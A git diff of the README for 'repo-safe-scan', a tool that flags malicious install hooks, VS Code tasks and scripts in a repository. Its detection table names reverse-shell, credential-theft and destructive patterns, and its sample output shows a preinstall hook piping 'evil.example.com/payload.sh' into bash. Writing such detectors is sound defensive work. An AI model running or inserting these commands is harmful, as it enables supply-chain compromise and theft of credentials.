@@ -19,7 +19,7 @@ Most security tools scan your **dependencies** for known vulnerabilities (e.g. C
 | `Makefile` default targets | Executes on `make` |
 | `*.sh` scripts | Called by any of the above |
 
-`repo-safe-scan` detects these patterns **before** you run anything.
+`repo-safe-scan` detects these patterns **before** you run anything, protecting your machine from reverse shells, credential exfiltration, and destructive payloads.
 
 ---
 
@@ -47,6 +47,7 @@ repo-safe-scan [path] [options]
 |------|-------------|---------|
 | `[path]` | Repository root to scan | `.` (current dir) |
 | `--severity <level>` | Minimum severity to report: `medium` \| `high` \| `critical` | `medium` |
+| `--include-node-modules` | Scan dependencies in `node_modules` for malicious lifecycle hooks | off |
 | `--json` | Output findings as JSON (for CI pipelines) | off |
 | `--no-color` | Disable colored terminal output | off |
 | `--version` | Print version | |
@@ -57,48 +58,53 @@ repo-safe-scan [path] [options]
 # Scan a locally cloned repo before installing
 repo-safe-scan ./suspicious-package
 
+# Scan including deeply nested dependencies
+repo-safe-scan ./suspicious-package --include-node-modules
+
 # Only show critical findings
 repo-safe-scan ./suspicious-package --severity critical
 
 # Machine-readable output for CI
-repo-safe-scan . --json | jq '.findings[] | select(.rule.severity=="critical")'
+repo-safe-scan . --json > results.json
 ```
+
+---
+
+## Features
+
+### 1. Robust JavaScript AST Parsing
+Attackers know you might be grepping for `curl` or `child_process`. They obfuscate.
+`repo-safe-scan` includes a **JavaScript AST (Abstract Syntax Tree) Analyzer** powered by `acorn` that understands code structure. It tracks variable bindings (`const cp = require("child_process")`), object destructuring (`const { exec } = cp`), and dynamic concatenation (`require("child_" + "process")`) to accurately flag dangerous execution streams.
+
+### 2. Command Normalization Engine
+Before testing configured commands against security rules, commands are normalized (quotes stripped, lowercase enforced, whitespace collapsed). This neutralizes straightforward casing and spacing bypass tricks (e.g., `cUrL        eViL.cOm | bAsH`).
+
+### 3. Smart Risk Scoring System
+The scanner computes a normalized **Repository Risk Score** out of 10.0 based on a weighted algorithm:
+- Critical finding = `25 pts`
+- High finding = `10 pts`
+- Medium finding = `4 pts`
+- Auto-executed Lifecycle Hooks (`preinstall`, etc.) = `+10 pts` bonus penalty.
+
+### 4. Dependency Lifecycle Scanning
+Use the `--include-node-modules` flag to hunt for supply-chain bombs hidden deep inside dependency lifecycle scripts in `node_modules/*/package.json`.
 
 ---
 
 ## What it Detects
 
-`repo-safe-scan` uses regex-based rules organized by category:
+The engine uses a modular rule system organized by category (`src/rules/`):
 
 | Category | Examples |
 |----------|---------|
 | **remote-execution** | `curl \| bash`, `wget \| sh`, `Invoke-Expression` |
 | **obfuscation** | `eval()`, `new Function()`, `base64 -d`, `fromCharCode` |
 | **reverse-shell** | `nc -e`, `/dev/tcp/`, `socat` |
-| **credential-theft** | Access to `~/.ssh`, `~/.aws/credentials`, `.npmrc` |
+| **credential-theft** | Access to `~/.ssh`, `~/.aws/credentials`, `.npmrc`, `.env` |
 | **destructive** | `rm -rf`, `del /f /q`, `format C:` |
 | **privilege-escalation** | `sudo` in npm scripts, `chmod +x` after download |
 | **tls-bypass** | `curl -k`, `wget --no-check-certificate` |
 | **reconnaissance** | `whoami \|`, `ifconfig \| curl` |
-
-### Lifecycle Hook Priority
-
-Scripts in `preinstall`, `postinstall`, `prepare`, and other auto-executed npm hooks are **automatically escalated** from `high` → `critical` because they run without any user interaction.
-
----
-
-## CI Integration
-
-Add a pre-install check to your CI pipeline:
-
-```yaml
-# GitHub Actions example
-- name: Scan repo for malicious scripts
-  run: npx repo-safe-scan . --severity high --json > scan-results.json
-  # exits with code 1 if any findings match the severity filter
-```
-
-`repo-safe-scan` exits with **code 1** when findings are detected, making it easy to fail a CI build.
 
 ---
 
@@ -107,7 +113,7 @@ Add a pre-install check to your CI pipeline:
 ### Terminal (default)
 
 ```
-  repo-safe-scan v1.0.0  🔍 Scanning: ./suspect-repo
+  repo-safe-scan v1.1.0  🔍 Scanning: ./suspect-repo
 
   📄 package.json
   ────────────────────────────────────────────────────────────
@@ -116,48 +122,38 @@ Add a pre-install check to your CI pipeline:
   Category:    remote-execution
   Script:      preinstall
   Command:     curl http://evil.example.com/payload.sh | bash
-  ...
+
+     ⚠ This script runs automatically on `npm install` — no user confirmation required. This is the primary supply-chain attack vector.
+
   ════════════════════════════════════════════════════════════
-  SUMMARY  2 critical  1 high  0 medium  (2 auto-executed lifecycle hooks)
-```
+  SUMMARY  1 critical  0 high  0 medium  (1 auto-executed lifecycle hooks)
+  Scanned path: ./suspect-repo
 
-### JSON (`--json`)
-
-```json
-{
-  "scannedPath": "./suspect-repo",
-  "findings": [
-    {
-      "file": "package.json",
-      "scriptName": "preinstall",
-      "command": "curl http://evil.example.com/payload.sh | bash",
-      "rule": {
-        "id": "curl-pipe-shell",
-        "description": "Downloads and pipes content directly into a shell",
-        "severity": "critical",
-        "category": "remote-execution"
-      },
-      "lifecycle": true,
-      "detail": null
-    }
-  ]
-}
+  ╔═════════════════════════════════════════╗
+  ║  Repository Risk Score:  3.5 / 10       ║
+  ║  ███████░░░░░░░░░░░░░  MODERATE         ║
+  ╚═════════════════════════════════════════╝
 ```
 
 ---
 
 ## Development
 
+The project is fully written in **TypeScript**.
+
 ```bash
 # Clone and install
-git clone https://github.com/yourname/repo-safe-scan.git
+git clone https://github.com/Chetan2708/repo-safe-scan.git
 cd repo-safe-scan
 npm install
+
+# Build
+npm run build
 
 # Run tests
 npm test
 
-# Run with coverage
+# Run tests with coverage
 npm run test:coverage
 
 # Scan the repo itself
@@ -169,39 +165,26 @@ npm start -- .
 ```
 repo-safe-scan/
 ├── bin/
-│   └── cli.js               # CLI entry point
+│   └── cli.ts               # CLI CLI orchestration & output rendering
 ├── src/
-│   ├── scanner.js           # Orchestrator — runs all analyzers
-│   ├── analyzers/
-│   │   ├── packageAnalyzer.js    # package.json scripts
-│   │   ├── vscodeAnalyzer.js     # .vscode/ (tasks, settings, extensions)
-│   │   ├── makefileAnalyzer.js   # Makefile targets
-│   │   └── shellScriptAnalyzer.js # *.sh / *.bash files
-│   └── rules/
-│       └── rules.js         # All detection rules (regex + severity + category)
+│   ├── scanner.ts           # Core orchestrator 
+│   ├── scoring.ts           # Risk Score logic
+│   ├── analyzers/           # Plugable analyzer registry
+│   │   ├── index.ts              # Registry
+│   │   ├── jsAstAnalyzer.ts      # AST JS/TS parsing (eval, cp.exec)
+│   │   ├── packageAnalyzer.ts    # package.json scripts
+│   │   ├── vscodeAnalyzer.ts     # .vscode/ tasks/settings
+│   │   ├── makefileAnalyzer.ts   # Makefile targets
+│   │   ├── shellScriptAnalyzer.ts# *.sh / *.bash 
+│   │   └── nodeModulesAnalyzer.ts# --include-node-modules scanner
+│   └── rules/               # Modular rule definitions
+│       ├── rules.ts         # Rule aggregator
+│       ├── destructive.rules.ts
+│       ├── execution.rules.ts
+│       ├── exfiltration.rules.ts
+│       └── obfuscation.rules.ts
 └── tests/
-    ├── packageAnalyzer.test.js
-    ├── vscodeAnalyzer.test.js
-    └── fixtures/
-        ├── malicious-repo/
-        ├── malicious-vscode/
-        └── clean-repo/
-```
-
----
-
-## Adding Custom Rules
-
-Edit `src/rules/rules.js` and add a rule object:
-
-```js
-{
-  id: "my-custom-rule",
-  description: "Explanation shown in output",
-  regex: /your-pattern-here/i,
-  severity: "high",        // 'medium' | 'high' | 'critical'
-  category: "my-category",
-}
+    └── fixtures/            # Test repositories
 ```
 
 ---
